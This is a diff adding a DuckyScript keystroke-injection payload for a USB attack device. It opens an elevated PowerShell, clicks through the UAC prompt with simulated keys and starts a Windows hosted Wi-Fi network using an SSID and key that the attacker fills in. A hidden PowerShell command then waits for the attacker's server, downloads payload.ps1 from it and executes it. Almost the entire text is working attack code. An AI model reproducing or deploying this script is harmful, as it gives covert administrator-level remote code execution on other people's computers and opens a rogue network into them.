@@ -1,0 +1,24 @@
+REM Author: h3ll0world
+REM Description: I'm STILL too lazy to put something here :)
+REM Requirements: Replace the SSID and the KEY to create the Hosted Network
+REM Requirements: Put the Web Server IP Address in the code.
+REM Requirements: Put the Web Server Address in the code WITHOUT the last'/' and WITH 'http://' at the start
+
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell start powershell -verb runas
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 750
+
+STRING netsh wlan set hostednetwork mode=allow ssid='PUT_HERE_THE_SSID' key='PUT_HERE_THE_KEY'
+ENTER
+DELAY 750
+STRING netsh wlan start hostednetwork
+ENTER
+DELAY 750
+
+STRING powershell -W H "while (!(ping PUT_HERE_JUST_THE_IP_ADDRESS -n 1)[2].Contains('PUT_HERE_JUST_THE_IP_ADDRESS')){}; Invoke-Expression (New-Object Net.WebClient).DownloadString('PUT_HERE_JUST_THE_FULL_SERVER_WEB_ADDRESS/payload.ps1'); x PUT_HERE_JUST_THE_FULL_SERVER_WEB_ADDRESS; netsh wlan start hostednetwork"
